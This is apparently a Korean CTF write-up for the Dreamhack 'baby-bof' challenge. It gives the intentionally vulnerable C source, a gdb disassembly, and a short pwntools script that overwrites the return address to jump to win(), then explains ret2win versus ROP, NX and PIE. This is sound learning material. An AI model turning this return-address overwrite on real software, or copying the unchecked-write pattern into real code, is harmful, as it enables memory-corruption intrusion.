---
layout: posts
title: "baby-bof"
categories: ["ctf"]
---


## 문제

# **Description**

**Simple pwnable 101 challenge**

**Q. What is Return Address?**

**Q. Explain that why BOF is dangerous.**

```c
┌──(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0423/deploy]
└─$ cat baby-bof.c
// gcc -o baby-bof baby-bof.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>

void proc_init ()
{
  setvbuf (stdin, 0, 2, 0); setvbuf (stdout, 0, 2, 0);
  setvbuf (stderr, 0, 2, 0);
}

void win ()
{
  char flag[100] = {0,};
  int fd;
  puts ("You mustn't be here! It's a vulnerability!");

  fd = open ("./flag", O_RDONLY);
  read(fd, flag, 0x60);
  puts(flag);
  exit(0);
}

long count;
long value;
long idx = 0;
int main ()
{
  char name[16];

  // don't care this init function
  proc_init ();
  printf ("the main function doesn't call win function (0x%lx)!\n", win);

  printf ("name: ");
  scanf ("%15s", name);

  printf ("GM GA GE GV %s!!\n: ", name);

  printf ("|  addr\t\t|  value\t\t|\n");
  for (idx = 0; idx < 0x10; idx++) {
    printf ("|  %lx\t|  %16lx\t|\n", name + idx *8, *(long*)(name + idx*8));
  }

  printf ("hex value: ");
  scanf ("%lx%c", &value);

  printf ("integer count: ");
  scanf ("%d%c", &count);

  for (idx = 0; idx < count; idx++) {
    *(long*)(name+idx*8) = value;
  }

  printf ("|  addr\t\t|  value\t\t|\n");
  for (idx = 0; idx < 0x10; idx++) {
    printf ("|  %lx\t|  %16lx\t|\n", name + idx *8, *(long*)(name + idx*8));
  }

  return 0;
}
```

## 해결

```c
gef➤  disassemble main
Dump of assembler code for function main:
   0x0000000000401325 <+0>:     endbr64
   0x0000000000401329 <+4>:     push   rbp
   0x000000000040132a <+5>:     mov    rbp,rsp
   0x000000000040132d <+8>:     sub    rsp,0x10
   0x0000000000401331 <+12>:    mov    eax,0x0
   0x0000000000401336 <+17>:    call   0x4011f6 <proc_init>
   0x000000000040133b <+22>:    lea    rax,[rip+0xffffffffffffff19]        # 0x40125b <win>
   0x0000000000401342 <+29>:    mov    rsi,rax
   0x0000000000401345 <+32>:    lea    rax,[rip+0xcf4]        # 0x402040
   0x000000000040134c <+39>:    mov    rdi,rax
   0x000000000040134f <+42>:    mov    eax,0x0
   0x0000000000401354 <+47>:    call   0x4010b0 <printf@plt>
   0x0000000000401359 <+52>:    lea    rax,[rip+0xd16]        # 0x402076
   0x0000000000401360 <+59>:    mov    rdi,rax
   0x0000000000401363 <+62>:    mov    eax,0x0
   0x0000000000401368 <+67>:    call   0x4010b0 <printf@plt>
   0x000000000040136d <+72>:    lea    rax,[rbp-0x10]
   0x0000000000401371 <+76>:    mov    rsi,rax
   0x0000000000401374 <+79>:    lea    rax,[rip+0xd02]        # 0x40207d
   0x000000000040137b <+86>:    mov    rdi,rax
   0x000000000040137e <+89>:    mov    eax,0x0
   0x0000000000401383 <+94>:    call   0x4010f0 <__isoc99_scanf@plt>
   0x0000000000401388 <+99>:    lea    rax,[rbp-0x10]
   0x000000000040138c <+103>:   mov    rsi,rax
   0x000000000040138f <+106>:   lea    rax,[rip+0xcec]        # 0x402082
   0x0000000000401396 <+113>:   mov    rdi,rax
   0x0000000000401399 <+116>:   mov    eax,0x0
   0x000000000040139e <+121>:   call   0x4010b0 <printf@plt>
   0x00000000004013a3 <+126>:   lea    rax,[rip+0xcec]        # 0x402096
   0x00000000004013aa <+133>:   mov    rdi,rax
   0x00000000004013ad <+136>:   call   0x4010a0 <puts@plt>
   0x00000000004013b2 <+141>:   mov    QWORD PTR [rip+0x2ce3],0x0        # 0x4040a0 <idx>
   0x00000000004013bd <+152>:   jmp    0x401418 <main+243>
   0x00000000004013bf <+154>:   mov    rax,QWORD PTR [rip+0x2cda]        # 0x4040a0 <idx>
   0x00000000004013c6 <+161>:   shl    rax,0x3
   0x00000000004013ca <+165>:   mov    rdx,rax
   0x00000000004013cd <+168>:   lea    rax,[rbp-0x10]
   0x00000000004013d1 <+172>:   add    rax,rdx
   0x00000000004013d4 <+175>:   mov    rax,QWORD PTR [rax]
   0x00000000004013d7 <+178>:   mov    rdx,QWORD PTR [rip+0x2cc2]        # 0x4040a0 <idx>
   0x00000000004013de <+185>:   shl    rdx,0x3
   0x00000000004013e2 <+189>:   mov    rcx,rdx
   0x00000000004013e5 <+192>:   lea    rdx,[rbp-0x10]
   0x00000000004013e9 <+196>:   add    rcx,rdx
   0x00000000004013ec <+199>:   mov    rdx,rax
   0x00000000004013ef <+202>:   mov    rsi,rcx
   0x00000000004013f2 <+205>:   lea    rax,[rip+0xcb2]        # 0x4020ab
   0x00000000004013f9 <+212>:   mov    rdi,rax
   0x00000000004013fc <+215>:   mov    eax,0x0
   0x0000000000401401 <+220>:   call   0x4010b0 <printf@plt>
   0x0000000000401406 <+225>:   mov    rax,QWORD PTR [rip+0x2c93]        # 0x4040a0 <idx>
   0x000000000040140d <+232>:   add    rax,0x1
   0x0000000000401411 <+236>:   mov    QWORD PTR [rip+0x2c88],rax        # 0x4040a0 <idx>
   0x0000000000401418 <+243>:   mov    rax,QWORD PTR [rip+0x2c81]        # 0x4040a0 <idx>
   0x000000000040141f <+250>:   cmp    rax,0xf
   0x0000000000401423 <+254>:   jle    0x4013bf <main+154>
   0x0000000000401425 <+256>:   lea    rax,[rip+0xc92]        # 0x4020be
   0x000000000040142c <+263>:   mov    rdi,rax
   0x000000000040142f <+266>:   mov    eax,0x0
   0x0000000000401434 <+271>:   call   0x4010b0 <printf@plt>
   0x0000000000401439 <+276>:   lea    rax,[rip+0x2c58]        # 0x404098 <value>
   0x0000000000401440 <+283>:   mov    rsi,rax
   0x0000000000401443 <+286>:   lea    rax,[rip+0xc80]        # 0x4020ca
   0x000000000040144a <+293>:   mov    rdi,rax
   0x000000000040144d <+296>:   mov    eax,0x0
   0x0000000000401452 <+301>:   call   0x4010f0 <__isoc99_scanf@plt>
   0x0000000000401457 <+306>:   lea    rax,[rip+0xc72]        # 0x4020d0
   0x000000000040145e <+313>:   mov    rdi,rax
   0x0000000000401461 <+316>:   mov    eax,0x0
   0x0000000000401466 <+321>:   call   0x4010b0 <printf@plt>
   0x000000000040146b <+326>:   lea    rax,[rip+0x2c1e]        # 0x404090 <count>
   0x0000000000401472 <+333>:   mov    rsi,rax
   0x0000000000401475 <+336>:   lea    rax,[rip+0xc64]        # 0x4020e0
   0x000000000040147c <+343>:   mov    rdi,rax
   0x000000000040147f <+346>:   mov    eax,0x0
   0x0000000000401484 <+351>:   call   0x4010f0 <__isoc99_scanf@plt>
   0x0000000000401489 <+356>:   mov    QWORD PTR [rip+0x2c0c],0x0        # 0x4040a0 <idx>
   0x0000000000401494 <+367>:   jmp    0x4014c7 <main+418>
   0x0000000000401496 <+369>:   mov    rax,QWORD PTR [rip+0x2c03]        # 0x4040a0 <idx>
   0x000000000040149d <+376>:   shl    rax,0x3
   0x00000000004014a1 <+380>:   mov    rdx,rax
   0x00000000004014a4 <+383>:   lea    rax,[rbp-0x10]
   0x00000000004014a8 <+387>:   add    rdx,rax
   0x00000000004014ab <+390>:   mov    rax,QWORD PTR [rip+0x2be6]        # 0x404098 <value>
   0x00000000004014b2 <+397>:   mov    QWORD PTR [rdx],rax
   0x00000000004014b5 <+400>:   mov    rax,QWORD PTR [rip+0x2be4]        # 0x4040a0 <idx>
   0x00000000004014bc <+407>:   add    rax,0x1
   0x00000000004014c0 <+411>:   mov    QWORD PTR [rip+0x2bd9],rax        # 0x4040a0 <idx>
   0x00000000004014c7 <+418>:   mov    rdx,QWORD PTR [rip+0x2bd2]        # 0x4040a0 <idx>
   0x00000000004014ce <+425>:   mov    rax,QWORD PTR [rip+0x2bbb]        # 0x404090 <count>
   0x00000000004014d5 <+432>:   cmp    rdx,rax
   0x00000000004014d8 <+435>:   jl     0x401496 <main+369>
   0x00000000004014da <+437>:   lea    rax,[rip+0xbb5]        # 0x402096
   0x00000000004014e1 <+444>:   mov    rdi,rax
   0x00000000004014e4 <+447>:   call   0x4010a0 <puts@plt>
   0x00000000004014e9 <+452>:   mov    QWORD PTR [rip+0x2bac],0x0        # 0x4040a0 <idx>
   0x00000000004014f4 <+463>:   jmp    0x40154f <main+554>
   0x00000000004014f6 <+465>:   mov    rax,QWORD PTR [rip+0x2ba3]        # 0x4040a0 <idx>
   0x00000000004014fd <+472>:   shl    rax,0x3
   0x0000000000401501 <+476>:   mov    rdx,rax
   0x0000000000401504 <+479>:   lea    rax,[rbp-0x10]
   0x0000000000401508 <+483>:   add    rax,rdx
   0x000000000040150b <+486>:   mov    rax,QWORD PTR [rax]
   0x000000000040150e <+489>:   mov    rdx,QWORD PTR [rip+0x2b8b]        # 0x4040a0 <idx>
   0x0000000000401515 <+496>:   shl    rdx,0x3
   0x0000000000401519 <+500>:   mov    rcx,rdx
   0x000000000040151c <+503>:   lea    rdx,[rbp-0x10]
   0x0000000000401520 <+507>:   add    rcx,rdx
   0x0000000000401523 <+510>:   mov    rdx,rax
   0x0000000000401526 <+513>:   mov    rsi,rcx
   0x0000000000401529 <+516>:   lea    rax,[rip+0xb7b]        # 0x4020ab
   0x0000000000401530 <+523>:   mov    rdi,rax
   0x0000000000401533 <+526>:   mov    eax,0x0
   0x0000000000401538 <+531>:   call   0x4010b0 <printf@plt>
   0x000000000040153d <+536>:   mov    rax,QWORD PTR [rip+0x2b5c]        # 0x4040a0 <idx>
   0x0000000000401544 <+543>:   add    rax,0x1
   0x0000000000401548 <+547>:   mov    QWORD PTR [rip+0x2b51],rax        # 0x4040a0 <idx>
   0x000000000040154f <+554>:   mov    rax,QWORD PTR [rip+0x2b4a]        # 0x4040a0 <idx>
   0x0000000000401556 <+561>:   cmp    rax,0xf
   0x000000000040155a <+565>:   jle    0x4014f6 <main+465>
   0x000000000040155c <+567>:   mov    eax,0x0
   0x0000000000401561 <+572>:   leave
   0x0000000000401562 <+573>:   ret
End of assembler dump.
```

```c
┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0423/deploy]
└─$ !c
cat ./exploit.py
from pwn import *

p = remote("host3.dreamhack.games", 17675)

win_addr_str = "401256"
p.sendlineafter("name: ", "hyeoni")
p.sendlineafter("hex value: ", win_addr_str)
p.sendlineafter("integer count: ", "4")

p.interactive()
```

### read 와 scanf 의 차이

- **`read(0, buf, 100)`**: 사용자가 키보드로 무엇을 치든 **바이트(Raw Bytes)** 그대로 `buf`에 저장한다. 이때는 `p64()`를 써야 한다.
- **`scanf("%lx", &val)`**: **`p64()`** 가 아닌 텍스트를 보내야 한다.

### ROP 를 안써도 되는 이유

### 1. 인자(Argument)가 필요 없는 `win()` 함수

64비트에서 ROP가 필수적으로 언급되는 이유는 **함수 호출 규약(Calling Convention)** 때문이다.

- **일반적인 경우:** `system("/bin/sh")`를 실행하려면 `/bin/sh` 주소를 `RDI` 레지스터에 넣어야 합니다. 스택에 있는 값을 레지스터로 옮겨줄 `pop rdi; ret` 같은 **ROP 가젯**이 꼭 필요
- **이 문제의 경우:** 우리가 호출하려는 `win()` 함수를 보세요. `void win()` 형태이며 **매개변수가 하나도 없다.**
    - 즉, 레지스터에 따로 값을 세팅해 줄 필요가 없다.
    - 단순히 리턴 주소(RET)를 `win` 함수의 시작 주소로 바꾸기만 하면, 컴퓨터는 아무 의심 없이 `win` 함수로 점프해서 내부 코드를 실행한다.

---

### 2. NX 비트와 가젯의 관계

- *NX(No-Execute)**가 걸려 있으면 스택에 직접 쉘코드를 써서 실행하는 것은 불가능 하지만 이미 코드 영역(`.text`)에 존재하는 함수인 `win()`으로 점프하는 것은 NX와 상관없이 가능
- **ROP:** 여러 개의 가젯을 엮어서 복잡한 동작(예: `execve` 호출)을 만드는 기술.
- **Ret2Win:** 이미 존재하는 "치트키" 같은 함수(`win`)로 한 번에 점프하는 기술.
- 이 문제에서는 `win`이라는 치트키가 이미 있으니 굳이 복잡하게 ROP 체인을 구성할 필요가 없는 것

---

### 3. PIE(Position Independent Executable)의 부재

제공해주신 코드 주석을 보면 `-no-pie` 옵션으로 컴파일되었다고 적혀 있다.

- **PIE가 있으면:** 함수의 주소가 실행할 때마다 변해서 `win` 주소를 미리 알 수 없다. 이럴 땐 ROP 등을 통해 주소를 먼저 알아내야(Leak) 한다.
- **PIE가 없으면:** `win` 함수의 주소는 항상 `0x401256` 등으로 고정된다. 그래서 공격자가 `value`에 그냥 이 주소를 바로 써넣을 수 있는 것
